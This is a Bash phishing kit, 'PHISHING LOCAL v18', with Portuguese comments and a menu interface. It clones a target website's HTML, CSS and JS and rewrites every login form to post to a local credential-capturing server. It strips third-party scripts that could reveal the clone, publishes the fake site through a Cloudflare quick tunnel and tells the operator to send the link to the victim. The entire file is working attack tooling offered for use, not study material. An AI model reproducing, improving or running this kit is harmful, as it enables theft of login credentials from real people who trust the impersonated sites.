#!/bin/bash
# ============================================
# 🎣 PHISHING LOCAL v18 - Funcional
# 1 Phish 2 Capturas 3 Túnel 4 Histórico 5 Parar 0 Sair
# ============================================

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; PURPLE='\033[0;35m'; WHITE='\033[1;37m'; NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

# Verificar se existe o server.js
if [ ! -f "$SCRIPT_DIR/server/server.js" ]; then
    echo -e "${RED}[ERRO] server.js não encontrado em $SCRIPT_DIR/server/${NC}"
    echo -e "${YELLOW}Verifique se o arquivo existe e rode novamente.${NC}"
    exit 1
fi
SITE_DIR="$SCRIPT_DIR/site_clone"
LOG_FILE="$SCRIPT_DIR/capturas.txt"
CAPTURED_DIR="$SCRIPT_DIR/captured_sites"

mkdir -p "$CAPTURED_DIR" "$SITE_DIR"

# =============================================
# VERIFICAR NODE.JS
# =============================================
if ! command -v node &>/dev/null; then
    echo -e "${YELLOW}[...] Node.js não encontrado. Instalando...${NC}"
    pkg install -y nodejs 2>/dev/null || {
        echo -e "${RED}[ERRO] Falha ao instalar Node.js. Instale manualmente:${NC}"
        echo -e "${WHITE}  pkg install nodejs${NC}"
        exit 1
    }
fi

# =============================================
# OBTER IP AUTOMÁTICO
# =============================================
get_my_ip() {
    local ip=""
    ip=$(ip addr show wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
    if [ -z "$ip" ]; then
        ip=$(ip addr 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1 | head -1)
    fi
    [ -z "$ip" ] && ip="127.0.0.1"
    echo "$ip"
}

# =============================================
# CLONAR SITE - BAIXA TUDO, MANTEM ORIGINAL
# =============================================
clone_site() {
    local target_url="$1"
    local redirect_url="$2"
    local port="${3:-8080}"

    rm -rf "$SITE_DIR"/*

    # curl com proxychains se disponível
    local curl_cmd="curl"
    local curl_opts="-s -L -k --connect-timeout 15"
    if command -v proxychains4 &>/dev/null; then
        curl_cmd="proxychains4 curl"
        echo -e "${GREEN}[ProxyChains ativo]${NC}"
    fi

    local ua="Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36"

    # 1. Baixar HTML principal
    echo -e "${YELLOW}[1/4] Baixando HTML...${NC}"
    $curl_cmd $curl_opts -H "$ua" -o "$SITE_DIR/index.html" "$target_url" > "$SCRIPT_DIR/curl.log" 2>&1

    if [ ! -s "$SITE_DIR/index.html" ]; then
        echo -e "${RED}[ERRO] Falha ao baixar o site.${NC}"
        cat "$SCRIPT_DIR/curl.log" 2>/dev/null
        return 1
    fi
    echo -e "${GREEN}  → $(wc -c < "$SITE_DIR/index.html") bytes${NC}"

    # Extrair domínio base
    local base_domain=$(echo "$target_url" | sed -E 's|(https?://[^/]+).*|\1|')

    # 2. Baixar CSS
    echo -e "${YELLOW}[2/4] Baixando CSS...${NC}"
    local css_count=0
    grep -oE 'href="[^"]*\.css[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/href="//;s/"//' | while read css_url; do
        [ -z "$css_url" ] && continue
        local css_file="css_${css_count}_$(basename "$css_url" | sed 's/[^a-zA-Z0-9._-]/_/g')"
        if echo "$css_url" | grep -q "^http"; then
            $curl_cmd $curl_opts -o "$SITE_DIR/$css_file" "$css_url" >> "$SCRIPT_DIR/curl.log" 2>&1
        elif echo "$css_url" | grep -q "^/"; then
            $curl_cmd $curl_opts -o "$SITE_DIR/$css_file" "${base_domain}${css_url}" >> "$SCRIPT_DIR/curl.log" 2>&1
        else
            $curl_cmd $curl_opts -o "$SITE_DIR/$css_file" "${base_domain}/${css_url}" >> "$SCRIPT_DIR/curl.log" 2>&1
        fi
        css_count=$((css_count + 1))
        sed -i "s|href=\"$css_url\"|href=\"$css_file\"|g" "$SITE_DIR/index.html"
    done
    echo -e "${GREEN}  → CSS baixados${NC}"

    # 3. Baixar JS
    echo -e "${YELLOW}[3/4] Baixando JS...${NC}"
    local js_count=0
    grep -oE 'src="[^"]*\.js[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/src="//;s/"//' | while read js_url; do
        [ -z "$js_url" ] && continue
        local js_file="js_${js_count}_$(basename "$js_url" | sed 's/[^a-zA-Z0-9._-]/_/g')"
        if echo "$js_url" | grep -q "^http"; then
            $curl_cmd $curl_opts -o "$SITE_DIR/$js_file" "$js_url" >> "$SCRIPT_DIR/curl.log" 2>&1
        elif echo "$js_url" | grep -q "^/"; then
            $curl_cmd $curl_opts -o "$SITE_DIR/$js_file" "${base_domain}${js_url}" >> "$SCRIPT_DIR/curl.log" 2>&1
        else
            $curl_cmd $curl_opts -o "$SITE_DIR/$js_file" "${base_domain}/${js_url}" >> "$SCRIPT_DIR/curl.log" 2>&1
        fi
        js_count=$((js_count + 1))
        sed -i "s|src=\"$js_url\"|src=\"$js_file\"|g" "$SITE_DIR/index.html"
    done
    echo -e "${GREEN}  → JS baixados${NC}"

    # 4. Modificar formulários pra captura
    echo -e "${YELLOW}[4/4] Configurando captura...${NC}"
    local my_ip=$(get_my_ip)

    # Capturar action original e redirecionar pra /login
    sed -i 's/action="[^"]*"/action="\/login"/gI' "$SITE_DIR/index.html"
    # Garantir method POST
    sed -i 's/<form\b/<form method="POST" action="\/login"/gI' "$SITE_DIR/index.html"
    # Trocar URLs do domínio original pelo IP local
    sed -i "s|${base_domain}|http://${my_ip}:${port}|gI" "$SITE_DIR/index.html"
    # Remover integrações externas que denunciam clone
    sed -i 's/<script[^>]*src="https:\/\/connect\.facebook\.net[^"]*"[^>]*><\/script>//gI' "$SITE_DIR/index.html"
    sed -i 's/<script[^>]*src="https:\/\/platform\.twitter\.com[^"]*"[^>]*><\/script>//gI' "$SITE_DIR/index.html"

    echo -e "${GREEN}  → Formulários hackeados, URLs trocadas${NC}"

    # Salvar no histórico
    local site_name=$(echo "$target_url" | sed -E 's|https?://||;s|[^a-zA-Z0-9.]|_|g')
    local ts=$(date +%Y%m%d_%H%M)
    local hist_dir="$CAPTURED_DIR/${site_name}_${ts}"
    mkdir -p "$hist_dir"
    cp -r "$SITE_DIR"/* "$hist_dir"/ 2>/dev/null

    # Salvar no histórico (arquivo)
    echo "${target_url}|${redirect_url}|${port}|$(date '+%Y-%m-%d %H:%M')|$hist_dir" >> "$SCRIPT_DIR/.history"

    echo ""
    echo -e "${GREEN}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║         ✅ CLONE REALIZADO!               ║${NC}"
    echo -e "${CYAN}╠═══════════════════════════════════════════╣${NC}"
    echo -e "${CYAN}║  ${WHITE}http://${my_ip}:${port}${NC}"
    echo -e "${GREEN}╚═══════════════════════════════════════════╝${NC}"

    # Iniciar servidor e manter rodando
    echo -e "${YELLOW}[...] Iniciando servidor na porta $port...${NC}"
    cd "$SCRIPT_DIR"
    REDIRECT_URL="$redirect_url" PORT="$port" SITE_DIR="$SITE_DIR" LOG_FILE="$LOG_FILE" node "$SCRIPT_DIR/server/server.js" > "$SCRIPT_DIR/server.log" 2>&1 &
    local pid=$!
    echo "$pid" > "$SCRIPT_DIR/.server.pid"
    sleep 3

    # Verificar se subiu
    if kill -0 "$pid" 2>/dev/null; then
        echo -e "${GREEN}[✓] Servidor rodando! PID: $pid${NC}"
        echo -e "${GREEN}[✓] Acesse: http://${my_ip}:${port}${NC}"
    else
        echo -e "${RED}[ERRO] Servidor não subiu. Log:${NC}"
        cat "$SCRIPT_DIR/server.log" 2>/dev/null
        rm -f "$SCRIPT_DIR/.server.pid"
    fi

    echo ""
    echo -e "${YELLOW}Pressione Enter para voltar ao menu...${NC}"
    read
}

# =============================================
# VER CAPTURAS - TEMPO REAL
# =============================================
view_captures() {
    clear
    echo -e "${PURPLE}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${PURPLE}║         📋 CREDENCIAIS CAPTURADAS       ║${NC}"
    echo -e "${PURPLE}╚═══════════════════════════════════════════╝${NC}"
    echo ""

    if [ ! -f "$LOG_FILE" ] || [ ! -s "$LOG_FILE" ]; then
        echo -e "${RED}  Nenhuma captura ainda.${NC}"
    else
        echo -e "${WHITE}═══════════════════════════════════════════${NC}"
        cat "$LOG_FILE"
        echo -e "${WHITE}═══════════════════════════════════════════${NC}"
        echo -e "${GREEN}  $(wc -l < "$LOG_FILE" | tr -d ' ') captura(s)${NC}"
    fi

    echo ""
    echo -e "${YELLOW}1) Limpar capturas${NC}"
    echo -e "${YELLOW}2) Tempo real (Ctrl+C = voltar)${NC}"
    echo -e "${YELLOW}Enter) Voltar${NC}"
    echo -n "> "
    read CHOICE

    case $CHOICE in
        1)
            > "$LOG_FILE"
            echo -e "${GREEN}[✓] Limpo.${NC}"
            echo -e "${YELLOW}Enter...${NC}"
            read
            ;;
        2)
            echo -e "${CYAN}(Ctrl+C pra voltar)${NC}"
            tail -n 5 -f "$LOG_FILE" 2>/dev/null || true
            ;;
    esac
}

# =============================================
# TÚNEL CLOUDFLARED
# =============================================
start_tunnel() {
    clear
    echo -e "${PURPLE}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${PURPLE}║         🌐 TÚNEL PÚBLICO                ║${NC}"
    echo -e "${PURPLE}╚═══════════════════════════════════════════╝${NC}"
    echo ""

    # Verificar servidor
    if [ ! -f "$SCRIPT_DIR/.server.pid" ]; then
        echo -e "${RED}  Servidor não está rodando! Faça phish primeiro.${NC}"
        echo ""
        echo -e "${YELLOW}Enter...${NC}"
        read
        return
    fi

    local pid=$(cat "$SCRIPT_DIR/.server.pid" 2>/dev/null)
    if ! kill -0 "$pid" 2>/dev/null; then
        echo -e "${RED}  Servidor parou. Faça phish de novo.${NC}"
        rm -f "$SCRIPT_DIR/.server.pid"
        echo ""
        echo -e "${YELLOW}Enter...${NC}"
        read
        return
    fi

    local port=$(grep 'PORT=' "$SITE_DIR/.config" 2>/dev/null | cut -d= -f2)
    [ -z "$port" ] && port=8080

    # Verificar cloudflared
    if ! command -v cloudflared &>/dev/null; then
        echo -e "${YELLOW}  cloudflared não encontrado. Instale:${NC}"
        echo -e "${WHITE}  pkg install cloudflared${NC}"
        echo ""
        echo -e "${YELLOW}Enter...${NC}"
        read
        return
    fi

    # Parar túnel anterior
    if [ -f "$SCRIPT_DIR/.tunnel.pid" ]; then
        kill $(cat "$SCRIPT_DIR/.tunnel.pid") 2>/dev/null
        rm -f "$SCRIPT_DIR/.tunnel.pid"
    fi
    pkill -f cloudflared 2>/dev/null
    sleep 1

    echo -e "${YELLOW}[...] Iniciando túnel na porta $port...${NC}"

    # Criar tunnel em background
    cloudflared tunnel --url "http://localhost:$port" > "$SCRIPT_DIR/.tunnel.log" 2>&1 &
    local tunnel_pid=$!
    echo "$tunnel_pid" > "$SCRIPT_DIR/.tunnel.pid"
    sleep 6

    # Capturar URL
    local tunnel_url=$(grep -oE 'https://[a-zA-Z0-9.-]+\.trycloudflare\.com' "$SCRIPT_DIR/.tunnel.log" 2>/dev/null | head -1)

    if [ -n "$tunnel_url" ] && [ "$tunnel_url" != "" ]; then
        echo ""
        echo -e "${GREEN}╔═══════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║  🌐 PRONTO!                               ║${NC}"
        echo -e "${GREEN}╠═══════════════════════════════════════════╣${NC}"
        echo -e "${GREEN}║  ${WHITE}$tunnel_url${NC}"
        echo -e "${GREEN}╚═══════════════════════════════════════════╝${NC}"
        echo ""
        echo -e "${YELLOW}  Mande pro alvo nesse link!${NC}"
    else
        echo -e "${YELLOW}  Túnel iniciado (demora alguns segundos).${NC}"
        echo -e "${YELLOW}  Verifique: cat $SCRIPT_DIR/.tunnel.log${NC}"
    fi

    echo ""
    echo -e "${YELLOW}1) Parar${NC}"
    echo -e "${YELLOW}Enter) Voltar${NC}"
    echo -n "> "
    read CHOICE

    if [ "$CHOICE" = "1" ]; then
        [ -f "$SCRIPT_DIR/.tunnel.pid" ] && kill $(cat "$SCRIPT_DIR/.tunnel.pid") 2>/dev/null
        rm -f "$SCRIPT_DIR/.tunnel.pid"
        pkill -f cloudflared 2>/dev/null
        echo -e "${GREEN}[✓] Parado.${NC}"
    fi
}

# =============================================
# HISTÓRICO
# =============================================
show_history() {
    clear
    echo -e "${PURPLE}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${PURPLE}║         📜 HISTÓRICO                    ║${NC}"
    echo -e "${PURPLE}╚═══════════════════════════════════════════╝${NC}"
    echo ""

    if [ ! -f "$SCRIPT_DIR/.history" ] || [ ! -s "$SCRIPT_DIR/.history" ]; then
        echo -e "${RED}  Sem clones.${NC}"
        echo ""
        echo -e "${YELLOW}Enter...${NC}"
        read
        return
    fi

    local count=0
    local all_urls=()
    local all_redirects=()
    local all_ports=()
    local all_dirs=()
    while IFS='|' read -r url redirect port timestamp dir; do
        count=$((count + 1))
        all_urls+=("$url")
        all_redirects+=("$redirect")
        all_ports+=("$port")
        all_dirs+=("$dir")
        echo -e "  ${GREEN}[$count]${NC} ${WHITE}$url${NC} ($timestamp)"
    done < "$SCRIPT_DIR/.history"

    [ "$count" -eq 0 ] && return

    echo ""
    echo -e "  ${RED}[0]${NC} Voltar"
    echo -n "Escolha: "
    read CHOICE

    [ "$CHOICE" = "0" ] && return

    if [ "$CHOICE" -gt 0 ] 2>/dev/null && [ "$CHOICE" -le "$count" ]; then
        local idx=$((CHOICE - 1))
        echo ""
        echo -e "${GREEN}  ${all_urls[$idx]}${NC}"
        echo ""
        echo -e "${YELLOW}1) Reusar${NC}"
        echo -e "${YELLOW}2) Atualizar${NC}"
        echo -e "${YELLOW}Enter) Voltar${NC}"
        echo -n "> "
        read ACT

        [ -z "$ACT" ] && return

        if [ "$ACT" = "1" ]; then
            rm -rf "$SITE_DIR"/*
            cp -r "${all_dirs[$idx]}"/* "$SITE_DIR"/ 2>/dev/null
            # Atualizar IP
            local my_ip=$(get_my_ip)
            local port="${all_ports[$idx]}"
            sed -i "s|http://[0-9.]*:[0-9]*|http://${my_ip}:${port}|g" "$SITE_DIR/index.html"
            cd "$SCRIPT_DIR"
            REDIRECT_URL="${all_redirects[$idx]}" PORT="$port" SITE_DIR="$SITE_DIR" LOG_FILE="$LOG_FILE" nohup node "$SCRIPT_DIR/server/server.js" > "$SCRIPT_DIR/server.log" 2>&1 &
            echo "$!" > "$SCRIPT_DIR/.server.pid"
            echo -e "${GREEN}[✓] Servidor em http://${my_ip}:${port}${NC}"
        elif [ "$ACT" = "2" ]; then
            clone_site "${all_urls[$idx]}" "${all_redirects[$idx]}" "${all_ports[$idx]}"
        fi
    fi
}

# =============================================
# LOCALHOST - Mostrar IP e porta
# =============================================
show_localhost() {
    clear
    echo -e "${PURPLE}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${PURPLE}║         📍 SERVIDOR LOCAL                ║${NC}"
    echo -e "${PURPLE}╚═══════════════════════════════════════════╝${NC}"
    echo ""

    if [ ! -f "$SCRIPT_DIR/.server.pid" ]; then
        echo -e "${RED}  Servidor OFF.${NC}"
        echo ""
        echo -e "${YELLOW}Enter...${NC}"
        read
        return
    fi

    local pid=$(cat "$SCRIPT_DIR/.server.pid" 2>/dev/null)
    if ! kill -0 "$pid" 2>/dev/null; then
        echo -e "${RED}  Servidor OFF (PID parou).${NC}"
        rm -f "$SCRIPT_DIR/.server.pid"
        echo ""
        echo -e "${YELLOW}Enter...${NC}"
        read
        return
    fi

    local port=$(grep 'PORT=' "$SITE_DIR/.config" 2>/dev/null | cut -d= -f2)
    local my_ip=$(get_my_ip)
    local target=$(grep 'TARGET_URL=' "$SITE_DIR/.config" 2>/dev/null | cut -d= -f2)
    local redirect=$(grep 'REDIRECT_URL=' "$SITE_DIR/.config" 2>/dev/null | cut -d= -f2)

    [ -z "$port" ] && port=8080

    echo -e "  ${GREEN}Status:${NC}  ${WHITE}ON ✓${NC}"
    echo -e "  ${GREEN}PID:${NC}     ${WHITE}$pid${NC}"
    echo -e "  ${GREEN}IP:${NC}      ${WHITE}$my_ip${NC}"
    echo -e "  ${GREEN}Porta:${NC}   ${WHITE}$port${NC}"
    echo -e "  ${GREEN}URL:${NC}     ${WHITE}http://${my_ip}:${port}${NC}"
    echo -e "  ${GREEN}Alvo:${NC}    ${WHITE}$target${NC}"
    echo -e "  ${GREEN}Redirect:${NC} ${WHITE}$redirect${NC}"
    echo ""
    echo -e "${YELLOW}Enter...${NC}"
    read
}

# =============================================
# LINK DO TÚNEL
# =============================================
show_tunnel_link() {
    clear
    echo -e "${PURPLE}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${PURPLE}║         🔗 LINK DO TÚNEL                 ║${NC}"
    echo -e "${PURPLE}╚═══════════════════════════════════════════╝${NC}"
    echo ""

    if [ ! -f "$SCRIPT_DIR/.tunnel.log" ] || [ ! -s "$SCRIPT_DIR/.tunnel.log" ]; then
        echo -e "${RED}  Túnel não está rodando.${NC}"
        echo -e "${YELLOW}  Crie o túnel primeiro (opção 3).${NC}"
        echo ""
        echo -e "${YELLOW}Enter...${NC}"
        read
        return
    fi

    local tunnel_url=$(grep -oE 'https://[a-zA-Z0-9.-]+\.trycloudflare\.com' "$SCRIPT_DIR/.tunnel.log" 2>/dev/null | head -1)

    if [ -n "$tunnel_url" ] && [ "$tunnel_url" != "" ]; then
        echo -e "${GREEN}╔═══════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║  🌐 LINK PÚBLICO:                        ║${NC}"
        echo -e "${GREEN}╠═══════════════════════════════════════════╣${NC}"
        echo -e "${GREEN}║  ${WHITE}$tunnel_url${NC}"
        echo -e "${GREEN}╚═══════════════════════════════════════════╝${NC}"
        echo ""
        echo -e "${YELLOW}  Manda esse link pro alvo!${NC}"
    else
        echo -e "${YELLOW}  Túnel rodando mas link não capturado ainda.${NC}"
        echo -e "${YELLOW}  Verifique: cat $SCRIPT_DIR/.tunnel.log${NC}"
    fi

    echo ""
    echo -e "${YELLOW}1) Recriar túnel${NC}"
    echo -e "${YELLOW}Enter) Voltar${NC}"
    echo -n "> "
    read CHOICE

    if [ "$CHOICE" = "1" ]; then
        start_tunnel
    fi
}
show_status() {
    clear
    echo -e "${PURPLE}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${PURPLE}║         📊 STATUS DO SISTEMA             ║${NC}"
    echo -e "${PURPLE}╚═══════════════════════════════════════════╝${NC}"
    echo ""

    # Node.js
    echo -n "  ${YELLOW}Node.js:${NC}       "
    if command -v node &>/dev/null; then
        echo -e "${GREEN}✓ $(node --version 2>/dev/null)${NC}"
    else
        echo -e "${RED}✗ Não instalado${NC}"
    fi

    # curl
    echo -n "  ${YELLOW}Curl:${NC}          "
    if command -v curl &>/dev/null; then
        echo -e "${GREEN}✓${NC}"
    else
        echo -e "${RED}✗${NC}"
    fi

    # Proxychains
    echo -n "  ${YELLOW}ProxyChains:${NC}    "
    if command -v proxychains4 &>/dev/null; then
        echo -e "${GREEN}✓${NC}"
    else
        echo -e "${YELLOW}○ Não instalado (opcional)${NC}"
    fi

    # Cloudflared
    echo -n "  ${YELLOW}Cloudflared:${NC}    "
    if command -v cloudflared &>/dev/null; then
        echo -e "${GREEN}✓${NC}"
    else
        echo -e "${RED}✗ Não instalado (opcional)${NC}"
    fi

    # grep -oE
    echo -n "  ${YELLOW}Grep -oE:${NC}      "
    if echo "test" | grep -qe "test" 2>/dev/null; then
        echo -e "${GREEN}✓${NC}"
    else
        echo -e "${RED}✗ (problema!)${NC}"
    fi

    echo ""

    # Servidor
    echo -n "  ${YELLOW}Servidor:${NC}       "
    if [ -f "$SCRIPT_DIR/.server.pid" ]; then
        local pid=$(cat "$SCRIPT_DIR/.server.pid")
        if kill -0 "$pid" 2>/dev/null; then
            echo -e "${GREEN}✓ Rodando (PID: $pid)${NC}"
        else
            echo -e "${RED}✗ Parou (PID: $pid)${NC}"
        fi
    else
        echo -e "${RED}✗ Desligado${NC}"
    fi

    # Túnel
    echo -n "  ${YELLOW}Túnel:${NC}          "
    if [ -f "$SCRIPT_DIR/.tunnel.pid" ]; then
        local pid=$(cat "$SCRIPT_DIR/.tunnel.pid")
        if kill -0 "$pid" 2>/dev/null; then
            echo -e "${GREEN}✓ Rodando${NC}"
        else
            echo -e "${RED}✗ Parou${NC}"
        fi
    else
        echo -e "${YELLOW}○ Desligado${NC}"
    fi

    # Ultima captura
    local cap_count=0
    if [ -f "$LOG_FILE" ]; then
        cap_count=$(wc -l < "$LOG_FILE" 2>/dev/null)
    fi
    echo -e "  ${YELLOW}Capturas:${NC}      ${WHITE}$cap_count${NC}"

    echo ""

    # Arquivos
    echo -e "  ${YELLOW}Arquivos:${NC}"
    if [ -f "$SCRIPT_DIR/server/server.js" ]; then
        echo -e "    ${GREEN}✓${NC} server/server.js"
    else
        echo -e "    ${RED}✗${NC} server/server.js"
    fi
    if [ -f "$SCRIPT_DIR/server/server.js.map" ]; then rm -f "$SCRIPT_DIR/server/server.js.map"; fi

    # Sites clonados
    if [ -d "$CAPTURED_DIR" ]; then
        local site_count=$(ls -d "$CAPTURED_DIR"/*/ 2>/dev/null | wc -l)
        echo -e "  ${YELLOW}Sites salvos:${NC}  ${WHITE}$site_count${NC}"
    fi

    # Logs
    if [ -f "$SCRIPT_DIR/server.log" ]; then
        echo -e "  ${YELLOW}Server.log:${NC}    $(wc -c < "$SCRIPT_DIR/server.log" 2>/dev/null | tr -d ' ') bytes"
    fi
    if [ -f "$SCRIPT_DIR/curl.log" ]; then
        echo -e "  ${YELLOW}Curl.log:${NC}      $(wc -c < "$SCRIPT_DIR/curl.log" 2>/dev/null | tr -d ' ') bytes"
    fi

    echo ""
    echo -e "${YELLOW}Enter...${NC}"
    read
}

stop_all() {
    if [ -f "$SCRIPT_DIR/.server.pid" ]; then
        local pid=$(cat "$SCRIPT_DIR/.server.pid")
        kill "$pid" 2>/dev/null
        rm -f "$SCRIPT_DIR/.server.pid"
    fi
    if [ -f "$SCRIPT_DIR/.tunnel.pid" ]; then
        local pid=$(cat "$SCRIPT_DIR/.tunnel.pid")
        kill "$pid" 2>/dev/null
        rm -f "$SCRIPT_DIR/.tunnel.pid"
    fi
    pkill -f "node.*server.js" 2>/dev/null
    pkill -f cloudflared 2>/dev/null
    echo -e "${GREEN}[✓] Tudo parado.${NC}"
}

# =============================================
# MENU
# =============================================
while true; do
    clear
    echo -e "${PURPLE}"
    echo "╔═══════════════════════════════════════════════╗"
    echo "║         🎣 PHISHING LOCAL v18                ║"
    echo "╚═══════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo ""
    echo -e "  ${GREEN}1)${NC} 🎣 PHISH     - Clonar e iniciar"
    echo -e "  ${GREEN}2)${NC} 📋 CAPTURAS  - Ver credenciais"
    echo -e "  ${GREEN}3)${NC} 🌐 TÚNEL     - Criar URL pública"
    echo -e "  ${GREEN}4)${NC} 📜 HISTÓRICO - Reusar clones"
    echo -e "  ${GREEN}5)${NC} 📍 LOCALHOST - Ver IP e porta"
    echo -e "  ${GREEN}6)${NC} 🔗 LINK      - Ver link do túnel"
    echo -e "  ${GREEN}7)${NC} 📊 STATUS    - Ver tudo"
    echo -e "  ${GREEN}8)${NC} 🛑 PARAR     - Desligar tudo"
    echo ""
    echo -e "  ${RED}0)${NC} ❌ SAIR"
    echo ""
    echo -n "Escolha: "
    read OP

    case $OP in
        1)
            clear
            echo -e "${CYAN}═══ PHISH ═══${NC}"
            echo ""
            echo -e "${YELLOW}URL do site:${NC} "
            read URL
            [ -z "$URL" ] && continue
            echo "$URL" | grep -q "^http" || URL="https://$URL"

            echo -e "${YELLOW}Redirect (Enter = mesma):${NC} "
            read REDIR
            [ -z "$REDIR" ] && REDIR="$URL"
            echo "$REDIR" | grep -q "^http" || REDIR="https://$REDIR"

            echo -e "${YELLOW}Porta (Enter = 8080):${NC} "
            read PT
            [ -z "$PT" ] && PT=8080

            clone_site "$URL" "$REDIR" "$PT"
            ;;
        2)
            view_captures
            ;;
        3)
            start_tunnel
            ;;
        4)
            show_history
            ;;
        5)
            show_localhost
            ;;
        6)
            show_tunnel_link
            ;;
        7)
            show_status
            ;;
        8)
            stop_all
            echo ""
            echo -e "${YELLOW}Enter...${NC}"
            read
            ;;
        0)
            stop_all
            exit 0
            ;;
        *)
            echo -e "${RED}Inválido!${NC}"
            ;;
    esac
done
